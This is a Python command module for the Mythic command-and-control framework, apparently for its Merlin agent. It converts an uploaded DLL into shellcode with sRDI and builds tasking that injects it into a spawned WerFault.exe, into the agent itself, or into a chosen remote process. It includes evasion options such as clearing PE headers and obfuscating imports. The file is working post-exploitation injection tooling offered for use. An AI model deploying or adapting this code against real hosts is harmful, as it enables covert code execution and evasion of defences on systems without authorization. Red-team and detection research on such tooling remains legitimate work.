
from CommandBase import *
import os
import json
import subprocess
from MythicResponseRPC import *

# Set to enable debug output to Mythic
debug = False


class SRDIArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "dll": CommandParameter(
                name="dll",
                type=ParameterType.File,
                description="DLL to convert to shellcode",
                required=True,
            ),
            "function-name": CommandParameter(
                name="function-name",
                type=ParameterType.String,
                description="The function to call after DllMain",
                required=False,
            ),
            "user-data": CommandParameter(
                name="user-data",
                type=ParameterType.String,
                description="Data to pass to the target function",
                required=False,
            ),
            "clear-header": CommandParameter(
                name="clear-header",
                type=ParameterType.Boolean,
                description="Clear the PE header on load",
                required=False,
            ),
            "obfuscate-imports": CommandParameter(
                name="obfuscate-imports",
                description="Randomize import dependency load order",
                type=ParameterType.Boolean,
                required=False,
            ),
            "import-delay": CommandParameter(
                name="import-delay",
                description="Number of seconds to pause between loading imports",
                type=ParameterType.Number,
                required=False,
            ),
            "verbose": CommandParameter(
                name="verbose",
                description="Show verbose output from sRDI",
                type=ParameterType.Boolean,
                required=False,
            ),
            "method": CommandParameter(
                name="method",
                type=ParameterType.ChooseOne,
                choices=["createprocess", "self", "remote", "RtlCreateUserThread", "userapc"],
                description="The shellcode injection method to use. Use createprocess if you want output back",
                required=True
            ),
            "pid": CommandParameter(
                name="pid",
                type=ParameterType.Number,
                description="The Process ID (PID) to inject the shellcode into. Not used with the 'self' method",
                required=False
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="the child process that will be started to execute the shellcode in. "
                            "Only used with the createprocess method",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                required=True
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="argument to create the spawnto process with, if any. "
                            "Only used with the createprocess method",
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                pass


class SRDICommand(CommandBase):
    cmd = "srdi"
    needs_admin = False
    help_cmd = "srdi"
    description = "sRDI allows for the conversion of DLL files to position independent shellcode. " \
                  "It attempts to be a fully functional PE loader supporting proper section permissions, " \
                  "TLS callbacks, and sanity checks. It can be thought of as a shellcode PE loader strapped to a " \
                  "packed DLL. https://github.com/monoxgas/sRDI."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@Ne0nd0g"
    argument_class = SRDIArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Starting create_tasking()')

        srdi_args = []
        if task.args.get_arg("function-name"):
            srdi_args.append("--function-name")
            srdi_args.append(task.args.get_arg("function-name"))
            task.args.remove_arg("function-name")
        if task.args.get_arg("user-data"):
            srdi_args.append("--user-data")
            srdi_args.append(task.args.get_arg("user-data"))
            task.args.remove_arg("user-data")
        if task.args.get_arg("clear-header"):
            srdi_args.append("--clear-header")
            task.args.remove_arg("clear-header")
        if task.args.get_arg("obfuscate-imports"):
            srdi_args.append("--obfuscate-imports")
            task.args.remove_arg("obfuscate-imports")
        if task.args.get_arg("import-delay"):
            srdi_args.append("--import-delay")
            srdi_args.append(task.args.get_arg("import-delay"))
            task.args.remove_arg("import-delay")

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Calling srdi()')
        results = srdi(task.args.get_arg("dll"), srdi_args)

        if task.args.get_arg("verbose"):
            await MythicResponseRPC(task).user_output(f'[sRDI]Verbose output:\r\n{results[1]}\r\n')

        command = {}
        if task.args.get_arg("method") == "createprocess":
            # Merlin jobs.MODULE
            task.args.add_arg("type", 16, ParameterType.Number)

            # 1. Shellcode
            # 2. SpawnTo Executable
            # 3. SpawnTo Arguments (must include even if empty string)

            # Merlin jobs.Command message type
            command = {
                "command": "createprocess",
                "args": [results[0], task.args.get_arg("spawnto"), task.args.get_arg("spawntoargs")],
            }
        else:
            # Merlin jobs.SHELLCODE
            task.args.add_arg("type", 12, ParameterType.Number)

            # Merlin jobs.Command message type
            command = {
                "method": task.args.get_arg("method").lower(),
                "bytes": results[0],
            }

            if task.args.get_arg("pid"):
                command["pid"] = task.args.get_arg("pid")

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("dll")
        task.args.remove_arg("method")
        task.args.remove_arg("verbose")
        task.args.remove_arg("pid")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Returned task:\r\n{task}\r\n')
        return task

    async def process_response(self, response: AgentResponse):
        pass


def srdi(dll, arguments):

    srdi_args = ['python3', '/opt/sRDI/ConvertToShellcode.py', 'srdi.dll'] + arguments

    # Write file to location in container
    with open('srdi.dll', 'wb') as w:
        w.write(dll)

    result = subprocess.run(srdi_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    srdi_bytes = bytes
    # Read srdi output
    with open('srdi.bin', 'rb') as output:
        srdi_bytes = output.read()

    # Close files
    w.close()
    output.close()

    # Remove files
    os.remove("srdi.dll")
    os.remove("srdi.bin")

    # Return Donut shellcode Base64 encoded
    return [base64.b64encode(srdi_bytes).decode("utf-8"), f'Commandline: {" ".join(srdi_args)}\r\n' + result.stdout.decode("utf-8")]
